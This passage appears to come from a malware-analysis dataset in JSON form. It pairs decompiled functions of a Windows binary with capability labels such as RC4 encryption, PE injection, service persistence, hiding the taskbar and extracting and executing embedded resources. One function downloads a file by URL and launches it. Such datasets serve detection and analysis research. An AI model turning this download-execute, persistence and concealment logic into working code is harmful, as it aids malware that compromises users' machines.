            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448bd8(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00448c00(arg_8h & 0xff, *(in_EAX + 0x43), *(in_EAX + 0x40), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 88
    },
    "00448c00": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448c00(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004485a4();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x30))(arg_8h, *((arg_10h & 0xff) * 4 + 0x49062c) | *((arg_ch & 0xff) * 4 + 0x49063c), arg_18h);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004598a0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004598a0(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x497c72);\n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x497c70);\n    return;\n}\n",
        "token_count": 79
    },
    "0048a41c": {
        "rules": [
            "create or open file",
            "create process on Windows",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048a41c(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack48 = 0x48a510;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407a28(0, arg_10h, arg_ch);\n    fcn.004881f8(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405728(&var_ch);\n    fcn.00405818();\n    uVar2 = fcn.004059dc();\n    uVar2 = func_0x00407960(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    fcn.004881f8(0, 0, 5);\n    fcn.00405728(&var_14h);\n    fcn.00405818();\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    func_0x0040ff34(0, 0x48a524, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48a517);\n    return;\n}\n",
        "token_count": 510
    },
    "0048aadc": {
        "rules": [
            "create or open file",
            "create thread",
            "write file on Windows",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048aadc(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    uStack56 = 0x48abf4;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407a28(0, arg_10h, arg_ch);\n    fcn.004881f8(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405728(0);\n    fcn.004058e0(0x48ac10, 0);\n    uVar2 = fcn.004059dc();\n    uVar2 = func_0x00407960(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 4);\n    fcn.004881f8();\n    fcn.00405728(0);\n    fcn.004058e0(0x48ac10, 0);\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048aa2c, uVar1, 0, &var_ch);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48abfb);\n    return;\n}\n",
        "token_count": 541
    },
    "0047dc00": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047dc00(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    float10 fVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint *arg_8h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *0x492774;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    _var_10h = CONCAT44(unaff_EBX, unaff_ESI);\n    _var_18h = CONCAT44(&stack0xfffffffc, 0x47de04);\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047dc00::var_1ch;\n    var_20h = **0x492610;\n    var_24h = 0x47dc34;\n    fcn.0048a574();\n    var_24h = var_1ch;\n    var_28h = 0x47dc44;\n    fcn.0046d960();\n    var_28h = 0x47dc4f;\n    fcn.00409b6c();\n    var_28h = var_20h;\n    var_2ch = 0x47dc61;\n    fcn.004058e0();\n    **0x49252c = 0;\n    uVar3 = 1;\n    **0x492664 = 0;\n    var_2ch = 0x47dc7f;\n    fcn.0046d960();\n    var_2ch = 0x47dc8c;\n    fcn.00405974();\n    if (uVar3) {\n        var_2ch = *0x4926e4;\n        sub.kernel32.dll_CreateThread_1(0, 0, 0x4810a8, 0, 0);\n        **0x4923ac = 1;\n    }\n    **0x492368 = 1;\n    arg_8h = &fcn.0047dc00::var_2ch;\n    fcn.0040ef34(arg_8h, *0x47de40);\n    fcn.00405584();\n    (**(***0x4922c4 + 0x2c))();\n    fcn.0048a59c();\n    fcn.00405584();\n    fcn.00405974();\n    if (uVar3) {\n        fVar4 = fcn.0040bc88();\n        _var_10h = fVar4;\n        var_ch = _var_10h >> 0x20;\n        fcn.0040c8e8(var_10h, var_ch);\n        fVar4 = fcn.0040bcb4();\n        _var_18h = fVar4;\n        var_14h = _var_18h >> 0x20;\n        fcn.0040c8e8(var_18h, var_14h);\n        fcn.004058e0(var_8h, 0x47de74, var_4h);\n    }\n    iVar2 = fcn.0041f9b4();\n    **0x4927d0 = iVar2;\n    *(**0x4927d0 + 0xf) = 1;\n    fcn.0041fbc0();\n    fcn.0041fe70();\n    while( true ) {\n        uVar6 = 0;\n        puVar5 = puVar1;\n        iVar2 = sub.user32.dll_GetMessageA(puVar1, 0, 0, 0);\n        if (iVar2 == 0) break;\n        sub.user32.dll_TranslateMessage(puVar1);\n        arg_8h = puVar1;\n        sub.user32.dll_DispatchMessageA();\n    }\n    *in_FS_OFFSET = puVar5;\n    fcn.00405554(0x47de0b, uVar6, arg_8h);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1067
    },
    "00411c38": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411c38(uint16_t param_1, uint16_t *param_2)\n\n{\n    if ((*param_2 & 0xfff) < 0x14) {\n        if ((param_1 & 0xfff) < 0x14) {\n            (***0x492698)();\n            fcn.00411288();\n        }\n        else {\n            fcn.00410e48();\n        }\n    }\n    else {\n        fcn.00411d24();\n        (***0x492698)();\n        fcn.00411288();\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00430ea0": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00430ea0(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x430eca;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 125
    },
    "0044877c": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0044877c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x44880e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x490644) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.004485a4();\n    if (cVar1 == '\\0') {\n        fcn.00407550();\n        fcn.0040daec();\n        fcn.00404ec4();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.004489a4();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x448815);\n    return;\n}\n",
        "token_count": 336
    },
    "0044a960": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a960(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405974(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00405584();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "00452f60": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452f60(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x452ffd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00419f14();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.0044a824();\n        fcn.0044a960();\n        fcn.00450804();\n        fcn.0044a6bc();\n        fcn.0044aa80();\n        (**(*param_2 + 0x34))(in_EAX[0x44], in_EAX[0x45]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x453004;\n    uStack28 = 0x452ffc;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 288
    },
    "0041fe70": {
        "rules": [
            "resume thread"
        ],
        "decompiled_code": "\nvoid fcn.0041fe70(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_ResumeThread(*(in_EAX + 4));\n    fcn.0041fb80();\n    if (iVar1 == 1) {\n        *(in_EAX + 0xe) = 0;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00423928": {
        "rules": [
            "encode data using XOR",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.00423928(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "004473a0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004473a0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00458568();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                cVar1 = (**(**(in_EAX + 0x84) + 0xf0))();\n                if (cVar1 == '\\0') {\n                    fcn.004471dc();\n                }\n                else {\n                    uVar2 = fcn.00458568(0);\n                    sub.user32.dll_ShowWindow(uVar2);\n                    fcn.00450724();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00467ebc": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00467ebc(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x467ef0, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x467f00, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x467f10, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 119
    },
    "00467f20": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00467f20(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x467f54, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x467f64, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x467f74, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 119
    },
    "00467f84": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00467f84(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x467fa8, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x467fb8, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 89
    },
    "00467fc8": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00467fc8(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x467fec, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x467ffc, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 87
    },
    "0046800c": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046800c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x468030, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x468040, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 87
    },
    "00468050": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00468050(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x468074, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x468084, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 86
    },
    "00468094": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00468094(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x4680b0, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "004680b8": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004680b8(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x4680d4, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 67
    },
    "0046b4e4": {
        "rules": [
            "hide graphical window",
            "find graphical window",
            "find taskbar",
            "hide the Windows taskbar"
        ],
        "decompiled_code": "\nvoid fcn.0046b4e4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46b4fc, 0, 5);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 62
    },
    "0046b50c": {
        "rules": [
            "hide graphical window",
            "find graphical window",
            "find taskbar",
            "hide the Windows taskbar"
        ],
        "decompiled_code": "\nvoid fcn.0046b50c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46b524, 0, 0);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 60
    },
    "00474b58": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl\nfcn.00474b58\n noreturn \n          (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint uStack40;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    iVar3 = 6;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puStack32 = 0x474b7c;\n    fcn.00405fe8();\n    var_20h = 0x474cc4;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_2ch = 0x474c65;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00474b58::var_30h;\n    puStack32 = &stack0xfffffffc;\n    fcn.00408550();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    fcn.004055c8();\n    uVar1 = fcn.004059dc(0, 0);\n    uVar2 = fcn.004059dc(uVar1);\n    iVar3 = sub.URLMON.DLL_URLDownloadToFileA(0, uVar2);\n    uVar4 = iVar3 == 0;\n    if (uVar4) {\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    else {\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00409b6c();\n    fcn.00405974();\n    if (uVar4) {\n        sub.shell32.dll_ShellExecuteA(0, 0x474d14, uVar1, 0, 0, 5);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 538
    },
    "0048734c": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0048734c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 0) {\n        sub.shell32.dll_ShellExecuteA(0, 0x4873a4, 0x48739c, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 1) {\n        sub.shell32.dll_ShellExecuteA(0, 0x4873a4, 0x4873ac, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 3) {\n        fcn.00461b78();\n        return;\n    }\n    if (in_EAX == 4) {\n        fcn.00461bb0();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0046bcbc": {
        "rules": [
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c"
        ],
        "decompiled_code": "\nvoid fcn.0046bcbc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t iStack132;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x46bce0;\n    fcn.004059cc();\n    uStack52 = 0x46bde2;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack60 = 0xf003f;\n    uStack64 = 0;\n    uStack68 = 0;\n    puStack72 = 0x46bd01;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA();\n    if (iVar1 != 0) {\n        uStack76 = 0x46bda7;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.004059dc(0, 0, 0, 0, 0);\n        uVar2 = sub.advapi32.dll_CreateServiceA();\n        fcn.00405728();\n        arg_8h = 0;\n        fcn.00405728();\n        fcn.00405864();\n        fcn.004059dc();\n        fcn.00405728();\n        fcn.0046b654(arg_8h);\n        sub.advapi32.dll_CloseServiceHandle(uVar2);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = iVar1;\n        iStack132 = iVar1;\n    }\n    *in_FS_OFFSET = iStack132;\n    fcn.00405554(0x46bde9);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 512
    },
    "0046cd90": {
        "rules": [
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cd90(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x46cda2;\n    fcn.004059cc();\n    uStack20 = 0x46cdd5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(param_2);\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x46cddc;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 190
    },
    "00404100": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404100(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 176
    },
    "004046b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004046b4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.004060ac();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 95
    },
    "00404800": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00404800(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0040487c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040487c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 117
    },
    "00405110": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405110(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x4957d4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4957d0 != 0) {\n        iVar1 = *(*0x4957d0 + 4);\n        uStack24 = 0x405159;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x4957d4 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00405174": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405174(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*0x4957d0 != NULL) {\n        iVar1 = **0x4957d0;\n        iVar4 = 0;\n        iVar2 = (*0x4957d0)[1];\n        uStack28 = 0x4051c1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x4957d4 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00405cd8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405cd8(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar3 = 0;\n    if (param_2 != NULL) {\n        iVar3 = *(param_2 + -4);\n    }\n    iVar2 = fcn.00404030();\n    if ((*(iVar2 + 4) == -0x284e) || (cVar1 = fcn.00403f98(iVar3, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar5 = *(iVar2 + 0x14) + *(iVar2 + 0xc);\n            iVar4 = *(iVar2 + 8) - *(iVar2 + 0xc);\n            if (iVar3 < iVar4) break;\n            *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar4;\n            iVar3 = iVar3 - iVar4;\n            for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *param_2;\n                param_2 = param_2 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            iVar4 = (**(iVar2 + 0x1c))();\n            if (iVar4 != 0) {\n                fcn.0040307c();\n                return iVar2;\n            }\n        }\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *param_2;\n            param_2 = param_2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 427
    },
    "004061e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n// WARNING: Removing unreachable block (ram,0x00406166)\n// WARNING: Removing unreachable block (ram,0x0040614c)\n\nvoid __fastcall fcn.004061e4(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.00405530();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00405d28();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.004060e0();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.004060f8();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if 